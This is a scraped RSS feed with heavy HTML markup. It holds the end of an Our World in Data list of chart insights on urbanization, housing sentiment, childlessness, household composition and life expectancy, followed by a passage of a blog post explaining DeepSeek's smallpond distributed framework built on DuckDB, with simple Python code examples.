https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/c9d2e006-4c8b-47c9-501f-178f6b406b00/w=1350 1350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/c9d2e006-4c8b-47c9-501f-178f6b406b00/w=1620 1620w" type="image/png" sizes="(max-width: 960px) 95vw, (min-width: 960px) 533px"><img src="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/c9d2e006-4c8b-47c9-501f-178f6b406b00/w=1620" alt="This chart compares the urbanization rates of Bangladesh and its neighboring countries (India, Myanmar, Nepal, and Sri Lanka) from 1972 to 2022. The y-axis represents the percentage of the population living in urban areas, ranging from 0% to 40%. Bangladesh shows the steepest increase, rising from 8% in 1972 to 40% in 2022, surpassing its neighbors. Other countries display slower and steadier growth." loading="lazy" data-filename="bangladesh-urban-mobile.png" width="1620" height="1620"></picture></div><div><p>February 28</p><h3>Bangladesh has been urbanizing much faster than its neighbors</h3><div><p><span>The biggest migration story of the past few centuries has not been from country to country but from rural areas to cities.</span></p><p><span>In 1960, </span><span><span>one-third of the world’s population</span></span><span> lived in urban areas. This share is now closing in on 60%. By contrast, </span><span><span>less than 4%</span></span><span> of the global population are international migrants.</span></p><p><span>But some countries are urbanizing much more quickly than others. Bangladesh is one example of a country that has experienced much faster internal migration than its South Asian neighbors. You can see this on the chart.</span></p><p><span>In 1972, just 8% of people in Bangladesh lived in towns and cities. This share has more than quadrupled to 40%.</span></p><p><span><span>Explore more data on the global movement of populations from rural areas to cities</span></span><span>&nbsp;→</span></p></div></div></a><a href="https://ourworldindata.org/data-insights#fourth-most-recent-data-insight"><div><picture><source srcset="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/8441b81e-466d-407c-e06b-16b6a82f3400/w=48 48w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/8441b81e-466d-407c-e06b-16b6a82f3400/w=100 100w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/8441b81e-466d-407c-e06b-16b6a82f3400/w=350 350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/8441b81e-466d-407c-e06b-16b6a82f3400/w=850 850w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/8441b81e-466d-407c-e06b-16b6a82f3400/w=1350 1350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/8441b81e-466d-407c-e06b-16b6a82f3400/w=1620 1620w" type="image/png" sizes="(max-width: 960px) 95vw, (min-width: 960px) 533px"><img src="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/8441b81e-466d-407c-e06b-16b6a82f3400/w=1620" alt="A horizontal bar chart titled &quot;Europeans are pessimistic on housing&quot; shows the survey responses from people in various European countries to the question: &quot;In general, do you think that your country is on the right track or the wrong track when it comes to housing?&quot;.

Each bar represents the percentage of responses categorized as: &quot;Wrong Track&quot;, &quot;Don't Know&quot;, and &quot;Right Track&quot; . 

Countries listed from top to bottom include: Netherlands, Spain, Hungary, Germany, Turkey, Great Britain, France, Ireland, Italy, Belgium, Sweden, and Poland. The chart reveals a dominant trend of pessimism, with many countries showing a higher percentage in the &quot;Wrong Track&quot; category. 

The data source is Ipsos (2025)" loading="lazy" data-filename="people-in-many-countries-are-pessimistic-about-housing.png" width="1620" height="1620"></picture></div><div><p>February 27</p><h3>Many Europeans say their nations are on the wrong track with housing</h3><div><p><span>The </span><span><span>Ipsos Housing Monitor 2025</span></span><span> surveyed people across 30 countries, asking: “In general, do you think that your country is on the right track or the wrong track when it comes to housing?”.</span></p><p><span>The chart shows results for European countries, where housing prices dipped after the 2008 global financial crisis, before starting to rise again around 2013, with particularly </span><span><span>large increases since 2015</span></span><span>.</span></p><p><span>The Netherlands and Spain stand out, with nearly 80% believing their country is on the wrong track.</span></p><p><span>People in Poland and Sweden are less concerned than in other countries. But even in these nations, the majority feels like their country is on the wrong track.</span></p><p><span><span>Explore more data on optimism and pessimism about the future</span></span><span> →</span></p></div></div></a><a href="https://ourworldindata.org/data-insights#fifth-most-recent-data-insight"><div><picture><source srcset="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9c124f8c-3063-4565-3628-2c0679d4af00/w=48 48w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9c124f8c-3063-4565-3628-2c0679d4af00/w=100 100w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9c124f8c-3063-4565-3628-2c0679d4af00/w=350 350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9c124f8c-3063-4565-3628-2c0679d4af00/w=850 850w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9c124f8c-3063-4565-3628-2c0679d4af00/w=1350 1350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9c124f8c-3063-4565-3628-2c0679d4af00/w=1620 1620w" type="image/png" sizes="(max-width: 960px) 95vw, (min-width: 960px) 533px"><img src="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9c124f8c-3063-4565-3628-2c0679d4af00/w=1620" alt="This chart shows the share of women who have had no births by the end of their childbearing years in four countries: the United States, Sweden, Japan, and Spain. 

Each country's data is represented on separate graphs, plotted against the years from 1918 to 1972 along the horizontal axis, labeled as &quot;Women's birth year.&quot; The vertical axis indicates the percentage of women who have had no births, ranging from 0% to 30%. 

In the United States graph, the percentage starts around 15% in 1918, dips slightly mid-century, and then rises again to near 20% by the early 1970s. 

The Sweden graph shows a relatively stable line around 10–15% throughout the years, with no significant fluctuations.

Japan's graph trends upward, reaching around 25% by the end of the timeline.

In Spain, the share steadily increases, culminating in over 20% by 1972, indicating a growing trend in women having no births.

The data source is cited as the &quot;Human Fertility Database (2024).&quot; The chart is published by Our World in Data." loading="lazy" data-filename="share-of-women-no-births-across-their-childbearing-years.png" width="1620" height="1620"></picture></div><div><p>February 26</p><h3>What share of women reach the end of their childbearing years without having children?</h3><div><p><span>This chart focuses on the share of women who had no births by the end of their childbearing years. The horizontal axis shows the woman’s birth year.</span></p><p><span>Around 18% of those born in the 1910s in the United States had no children. For the following generations who grew up during the “baby boom”, the share with no children dropped to 5%. Since then, this figure has risen and fallen again.</span></p><p><span>In Sweden, the share of women without any children has remained relatively stable at around 12% for women born between the 1950s and 1970s.</span></p><p><span>The trend in Japan and Spain has been different: the share of women with no children has grown steeply over recent generations. In Spain, the figure nearly doubled in a decade: from 10% for women born in 1960 to almost 20% for those born in 1970. In Japan, it almost tripled in twenty years.</span></p><p><span><span>Explore this data for twenty more countries</span></span><span> →</span></p></div></div></a><a href="https://ourworldindata.org/data-insights#sixth-most-recent-data-insight"><div><picture><source srcset="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/06b9c187-4721-457a-7cd9-00fe24c71500/w=48 48w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/06b9c187-4721-457a-7cd9-00fe24c71500/w=100 100w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/06b9c187-4721-457a-7cd9-00fe24c71500/w=350 350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/06b9c187-4721-457a-7cd9-00fe24c71500/w=850 850w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/06b9c187-4721-457a-7cd9-00fe24c71500/w=1350 1350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/06b9c187-4721-457a-7cd9-00fe24c71500/w=1620 1620w" type="image/png" sizes="(max-width: 960px) 95vw, (min-width: 960px) 533px"><img src="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/06b9c187-4721-457a-7cd9-00fe24c71500/w=1620" alt="The bar chart illustrates changes in household composition in the United States from 1960 to 2015. The chart consists of three horizontal bars, each representing a different year: 1960, 1990, and 2015. 

In 1960, the largest segment is &quot;Couple with children,&quot; which accounts for 43%. Other segments include: &quot;Single parent with children&quot; at 5%, &quot;Couple&quot; at 22%, &quot;Extended family&quot; at 12%, &quot;Non-relatives&quot; at 4%, and &quot;One person&quot; at 13%.

By 1990, the &quot;Couple with children&quot; category has decreased to 30%. The breakdown is: &quot;Single parent with children&quot; at 8%, &quot;Couple&quot; at 24%, &quot;Extended family&quot; at 8%, &quot;Non-relatives&quot; at 5%, and &quot;One person&quot; at 25%.

In 2015, &quot;Couple with children&quot; drops further to 24%, with the segments now being: &quot;Single parent with children&quot; at 9%, &quot;Couple&quot; at 25%, &quot;Extended family&quot; at 9%, &quot;Non-relatives&quot; at 5%, and &quot;One person&quot; increasing to 28%.

Data sources for the chart are cited as United Nations, 2022." loading="lazy" data-filename="us-household-composition.png" width="1620" height="1620"></picture></div><div><p>February 25</p><h3>Solo living has become the most common arrangement for households in the United States</h3><div><p><span>Households in the United States have changed significantly over the last 60 years. In 1960, 43% of households were couples with children, but this had dropped to 24% by 2015.</span></p><p><span>Once a minority, single individuals living alone are now the most common composition, making up 28% of households in 2015.</span></p><p><span>Several factors may explain this shift. Since 2000, most population growth </span><span><span>has occurred</span></span><span> among those over 60, who are more likely to live alone after widowhood or once children leave home. Declining birth rates have further reduced the share of households with children.</span></p><p><span>At the same time, </span><span><span>rising incomes</span></span><span> among </span><span><span>women</span></span><span>, in particular, have made independent living more accessible, likely contributing to the increase in single-person households alongside the trend of </span><span><span>marrying later</span></span><span> or </span><span><span>not at all</span></span><span>.</span></p><p><span><span>Explore how household types compare across different countries</span></span><span> →</span></p></div></div></a><a href="https://ourworldindata.org/data-insights#seventh-most-recent-data-insight"><div><picture><source srcset="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/0500bed3-b4f7-42c9-b52d-6f074bc3da00/w=48 48w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/0500bed3-b4f7-42c9-b52d-6f074bc3da00/w=100 100w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/0500bed3-b4f7-42c9-b52d-6f074bc3da00/w=350 350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/0500bed3-b4f7-42c9-b52d-6f074bc3da00/w=850 850w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/0500bed3-b4f7-42c9-b52d-6f074bc3da00/w=1350 1350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/0500bed3-b4f7-42c9-b52d-6f074bc3da00/w=1620 1620w" type="image/png" sizes="(max-width: 960px) 95vw, (min-width: 960px) 533px"><img src="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/0500bed3-b4f7-42c9-b52d-6f074bc3da00/w=1620" alt="The chart titled &quot;Women live longer than men in every country&quot; shows a scatter plot of life expectancy for men and women in 2023, categorized by continent. Each dot represents a country, with its color indicating the continent: Africa, Asia, Europe, North America, Oceania, or South America. The x-axis displays life expectancy for men, while the y-axis shows life expectancy for women. A diagonal line indicates where life expectancy for both genders would be equal. All dots are above this line, meaning women have a higher life expectancy than men in every country. The trend shows increasing life expectancy for both genders, with women consistently living longer. Data source: UN World Population Prospects (2024)." loading="lazy" data-filename="women-live-longer-mobile.png" width="1620" height="1620"></picture></div><div><p>February 24</p><h3>Women live longer than men in every country in the world</h3><div><p><span>In every country in the world, women tend to live longer than men.</span></p><p><span>You can see this in the chart, which shows the average life expectancy of women on the vertical axis and the life expectancy of men on the horizontal axis, both for 2023. Each dot is one country.</span></p><p><span>As you can see, all countries lie </span><em><span>above</span></em><span> the middle line, which means that women's life expectancy was higher than men's.</span></p><p><span>There are various reasons why this gap in life expectancy exists, which my colleagues Saloni Dattani and Lucas Rodés-Guirao </span><span><span>explain in their article</span></span><span>. Typically, births are skewed in favor of males, with around 105 boys being born for every 100 girls. However, throughout childhood, adolescence, and adulthood, mortality rates tend to be higher in males.</span></p><p><span>This data comes from the United Nations’ World Population Prospects.</span></p><p><span><span>Read our article on why women live longer than men</span></span><span>&nbsp;→</span></p></div></div></a></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[DeepSeek's smallpond: Bringing Distributed Computing to DuckDB (145 pts)]]></title>
            <link>https://mehdio.substack.com/p/duckdb-goes-distributed-deepseeks</link>
            <guid>43248947</guid>
            <pubDate>Tue, 04 Mar 2025 01:09:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mehdio.substack.com/p/duckdb-goes-distributed-deepseeks">https://mehdio.substack.com/p/duckdb-goes-distributed-deepseeks</a>, See on <a href="https://news.ycombinator.com/item?id=43248947">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09a8f44b-d040-454e-8c01-999fe6121507_1600x900.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09a8f44b-d040-454e-8c01-999fe6121507_1600x900.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09a8f44b-d040-454e-8c01-999fe6121507_1600x900.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09a8f44b-d040-454e-8c01-999fe6121507_1600x900.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09a8f44b-d040-454e-8c01-999fe6121507_1600x900.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09a8f44b-d040-454e-8c01-999fe6121507_1600x900.png" width="1456" height="819" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/09a8f44b-d040-454e-8c01-999fe6121507_1600x900.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:819,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:149879,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:&quot;https://mehdio.substack.com/i/158100947?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09a8f44b-d040-454e-8c01-999fe6121507_1600x900.png&quot;,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09a8f44b-d040-454e-8c01-999fe6121507_1600x900.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09a8f44b-d040-454e-8c01-999fe6121507_1600x900.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09a8f44b-d040-454e-8c01-999fe6121507_1600x900.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09a8f44b-d040-454e-8c01-999fe6121507_1600x900.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p>DeepSeek has made a lot of noise lately. Their R1 model, released in January 2025, outperformed competitors like OpenAI’s O1 at launch. But what truly set it apart was its highly efficient infrastructure—dramatically reducing costs while maintaining top-tier performance.</p><p><span>Now, they're coming for data engineers. </span><a href="https://github.com/deepseek-ai" rel="">DeepSeek</a><span> released a bunch of small repositories as independent code modules. </span><a href="https://www.linkedin.com/in/thom-wolf/" rel="">Thomas Wolf</a><span>, Co-founder and Chief of Product at HuggingFace </span><a href="https://www.linkedin.com/posts/thom-wolf_i-want-to-share-bit-of-context-on-todays-activity-7300872211794440192-QJIb?utm_source=share&amp;utm_medium=member_desktop&amp;rcm=ACoAAA0tl2QBJUocRMpCGqvWI8N_YbcsbmkLctY" rel="">shared some of his highlights</a><span>, but we're going to focus on one particularly important project went that unmentioned—</span><strong><a href="https://github.com/deepseek-ai/smallpond" rel="">smallpond</a></strong><span>, a distributed compute framework built on </span><strong><a href="https://duckdb.org/" rel="">DuckDB</a><span>. </span></strong><span>DeepSeek is pushing DuckDB beyond its single-node roots with smallpond, a new, simple approach to distributed computing.</span></p><p>First, having DeepSeek, a hot AI company, using DuckDB is a significant statement, and we'll understand why. Second, we'll dive into the repository itself, exploring their smart approach to enabling DuckDB as a distributed system, along with its limitations and open questions.</p><p><span>I assume you're familiar with DuckDB. I've created </span><a href="https://www.youtube.com/playlist?list=PLIYcNkSjh-0wlrFUE2VvQilLU2aBPns0K" rel="">tons of content around it</a><span>. But just in case, here's a high-level recap.</span></p><blockquote><p><span>For transparency, at the time of writing this blog, I’m a data engineer and DevRel at </span><a href="https://motherduck.com/" rel="">MotherDuck</a><span>. MotherDuck provides a cloud-based version of DuckDB with enhanced features. Its approach differs from what we’ll discuss here, and while I’ll do my best to remain objective, just a heads-up! 🙂</span></p></blockquote><p>DuckDB is an in-process analytical database, meaning it runs within your application without requiring a separate server. You can install it easily in multiple programming languages by adding a library—think of it as the SQLite of analytics, but built for high-performance querying on large datasets.</p><p>It's built in C++ and contains all the integrations you might need for your data pipelines (AWS S3/Google Cloud Storage, Parquet, Iceberg, spatial data, etc.), and it's damn fast. Besides working with common file formats, it has its own efficient storage format—a single ACID-compliant file containing all tables and metadata, with strong compression.</p><p>In Python, getting started is as simple as:</p><pre><code><code>pip install duckdb</code></code></pre><p>Then, load and query a Parquet file in just a few lines:</p><pre><code><code>import duckdb
conn = duckdb.connect()
conn.sql("SELECT * FROM '/path/to/file.parquet'")</code></code></pre><p><span>It also supports reading and writing to </span><a href="https://pandas.pydata.org/docs/index.html" rel="">Pandas</a><span> and </span><a href="https://pola.rs/" rel="">Polars</a><span> DataFrames with zero copy, thanks to Arrow.</span></p><pre><code><code>import duckdb
import pandas

# Create a Pandas dataframe
my_df = pandas.DataFrame.from_dict({'a': [42]})

# query the Pandas DataFrame "my_df"
# Note: duckdb.sql connects to the default in-memory database connection
results = duckdb.sql("SELECT * FROM my_df").df()</code></code></pre><p>We talk a lot about LLM frameworks, models, and agents, but we often forget that the first step in ANY AI project comes down to data.</p><p>Whether it's for training, RAG, or other applications, it all comes down to feeding systems with good, clean data. But how do we even accomplish that step? Through data engineering. Data engineering is a crucial step in AI workflows but is less discussed because it's less "sexy" and less "new."</p><p><span>Regarding DuckDB, we've already seen other AI companies like </span><a href="https://huggingface.co/" rel="">HuggingFace</a><span> using it behind the scenes to quickly serve and explore their datasets library through their </span><a href="https://huggingface.co/docs/hub/en/datasets-viewer" rel="">dataset viewer.</a></p><p><span>Now, DeepSeek is introducing </span><em>smallpond</em><span>, a lightweight open-source framework, leveraging DuckDB to process terabyte-scale datasets in a distributed manner. Their benchmark states: _“Sorted 110.5TiB of data in 30 minutes and 14 seconds, achieving an average throughput of 3.66TiB/min.” </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F75b3f4a5-7e53-40da-9044-86c44af20dcd_2628x546.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F75b3f4a5-7e53-40da-9044-86c44af20dcd_2628x546.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F75b3f4a5-7e53-40da-9044-86c44af20dcd_2628x546.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F75b3f4a5-7e53-40da-9044-86c44af20dcd_2628x546.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F75b3f4a5-7e53-40da-9044-86c44af20dcd_2628x546.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F75b3f4a5-7e53-40da-9044-86c44af20dcd_2628x546.png" width="1456" height="303" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/75b3f4a5-7e53-40da-9044-86c44af20dcd_2628x546.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:303,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:158598,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://mehdio.substack.com/i/158100947?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F75b3f4a5-7e53-40da-9044-86c44af20dcd_2628x546.png&quot;,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F75b3f4a5-7e53-40da-9044-86c44af20dcd_2628x546.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F75b3f4a5-7e53-40da-9044-86c44af20dcd_2628x546.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F75b3f4a5-7e53-40da-9044-86c44af20dcd_2628x546.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F75b3f4a5-7e53-40da-9044-86c44af20dcd_2628x546.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Source : https://github.com/deepseek-ai/smallpond</figcaption></figure></div><p><span>While we've seen DuckDB crushing 500GB on a single node easily (</span><a href="https://benchmark.clickhouse.com/" rel="">clickbench</a><span>), this enters another realm of data size.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F823ded79-b00e-46ee-a9d0-6739ae6beb56_4092x724.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F823ded79-b00e-46ee-a9d0-6739ae6beb56_4092x724.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F823ded79-b00e-46ee-a9d0-6739ae6beb56_4092x724.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F823ded79-b00e-46ee-a9d0-6739ae6beb56_4092x724.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F823ded79-b00e-46ee-a9d0-6739ae6beb56_4092x724.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F823ded79-b00e-46ee-a9d0-6739ae6beb56_4092x724.png" width="1456" height="258" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/823ded79-b00e-46ee-a9d0-6739ae6beb56_4092x724.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:258,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:293920,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://mehdio.substack.com/i/158100947?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F823ded79-b00e-46ee-a9d0-6739ae6beb56_4092x724.png&quot;,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F823ded79-b00e-46ee-a9d0-6739ae6beb56_4092x724.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F823ded79-b00e-46ee-a9d0-6739ae6beb56_4092x724.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F823ded79-b00e-46ee-a9d0-6739ae6beb56_4092x724.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F823ded79-b00e-46ee-a9d0-6739ae6beb56_4092x724.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Clickbench benchmark</figcaption></figure></div><p>But wait, isn't DuckDB single-node focused? What's the catch here?</p><p>Let's dive in.</p><p><span>smallpond follows a </span><strong>lazy evaluation</strong><span> approach when performing operations on DataFrames (</span><code>map()</code><span>, </span><code>filter()</code><span>, </span><code>partial_sql()</code><span>, etc.), meaning it doesn’t execute them immediately. Instead, it constructs a </span><strong>logical plan</strong><span> represented as a </span><strong>directed acyclic graph (DAG)</strong><span>, where each operation corresponds to a node in the graph (e.g., </span><code>SqlEngineNode</code><span>, </span><code>HashPartitionNode</code><span>, </span><code>DataSourceNode</code><span>).</span></p><p>Execution is only triggered when an action is called, such as:</p><ul><li><p><code>write_parquet()</code><span> – Write data to disk</span></p></li><li><p><code>to_pandas()</code><span> – Convert to a pandas DataFrame</span></p></li><li><p><code>compute()</code><span> – Explicitly request computation</span></p></li><li><p><code>count()</code><span> – Count rows</span></p></li><li><p><code>take()</code><span> – Retrieve rows</span></p></li></ul><p>This approach optimizes performance by deferring computation until necessary, reducing redundant operations and improving efficiency.</p><p><span>When execution is triggered, the logical plan is converted into an execution plan. The execution plan consists of tasks (e.g., </span><code>SqlEngineTask</code><span>, </span><code>HashPartitionTask</code><span>) that correspond to the nodes in the logical plan. These tasks are the actual units of work that will be distributed and executed through </span><a href="https://ray.io/" rel="">Ray</a><span>.</span></p><p><span>The important thing to understand is that the distribution mechanism in smallpond operates at the Python level with help from </span><a href="https://www.ray.io/" rel="">Ray</a><span>, specifically </span><a href="https://docs.ray.io/en/latest/ray-core/walkthrough.html" rel="">Ray 